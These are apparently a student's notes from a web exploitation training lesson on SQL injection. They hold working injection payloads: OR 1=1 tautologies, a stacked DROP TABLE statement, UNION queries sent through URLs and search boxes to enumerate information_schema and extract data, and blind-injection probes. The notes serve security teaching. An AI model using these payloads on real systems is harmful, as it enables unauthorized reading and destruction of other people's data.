------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
https://sec.cybbh.io/public/security/latest/lessons/lesson-5-sql_sg.html -----> WEB EXPLOITATION DAY 2 FG
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
SQL Injection:
The use of Valid SQL Queries, via input data fields or attaching of queries to the end of URLs, from the client-side to a server-side application. This allows data to be read or modified.
SQL injections rely on unsanitized input fields.
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
SQL Injection - Considerations
- Requires Valid SQL Queries
- Fully patched systems can be vulnerable due to misconfiguration
- Input Field Sanitization
- String vs Integer Values
- Is INFORMATION_SCHEMA Database available?
- GET Request versus POST Request HTTP methods
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Methods to find an unsanitized field:
    - ' (single quote) will return extraneous information if the field isn’t sanitized
        - We are trying to end the string and attach additional variables, or clauses, to the back-end SQL query
    - If ' (single qoute) displays no error messages or generic errors than field is likely sanitized.
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Important SQL Commands:
SELECT - extracts data from a database
UNION - Used to COMBINE the result-set of TWO OR MORE SELECT STATEMENTS
UPDATE - updates data in a database
DELETE - deletes data from a database
INSERT INTO - inserts new data into a database
CREATE DATABASE - creates a new database
ALTER DATABASE - modifies a database
CREATE TABLE - creates a new table
ALTER TABLE - modifies a table
DROP TABLE - deletes a table
CREATE INDEX - creates an index (search key)
DROP INDEX - deletes an index
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
DEMO
mysql:
    - show databases;
    - show tables from session;
        - select * from session car;
            - describe car;
            - select name,type from car;
    - use session;
    - select * from car UNION select tireid,name,size,cost,1,2 FROM Tires;
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 OR 1='1 -----> inserting a true statement
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
DEMO
- select * from user;
    - select id from user where name='admin';
    - select id from user where name='tom' OR 1=1;
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Stacking Statements:
Chaining multiple statements together using a semi-colon

Ex.) SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
"Ignore the rest"

- Using # or -- tells the Database to ignore everything after that line

Ex.) SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
Ex.) ... UNION select table_schema,table_name FROM information_Schema.tables;#
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
GET ----> Utilizing URL bar
<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables
<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_schema,table_name FROM information_schema.tables
<URL>/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columns
<URL>/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
<URL>/uniondemo.php?Selection=2 UNION SELECT null,name,color FROM car
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
POST ----> Utilizing Search Box
Audi' UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables #
Audi' UNION SELECT 1,2,3,table_schema,table_name FROM information_schema.tables; #
Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #     -- "Golden" statement
Audi' UNION SELECT 1,2,3,name,size FROM session.Tires; #
Audi' UNION SELECT @@version,database(),3,name,size FROM session.Tires; #
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Blind Injection:
Used when unsanitized fields give generic error or no messages

GET METHOD:
- <URL>/.php?Selection=2 Union SELECT 1,2
- <URL>/.php?item=4 OR 1=1
- <URL>/.php?item=4 UNION SELECT 1,2
- <URL>/.php?item=4 UNION SELECT 1,2,@@version
- <URL>/.php?item=4 UNION SELECT 1,table_name,3 from information_schema.tables where table_schema=database()

POST METHOD
- Audi' UNION SELECT 1,2,3,4 #                























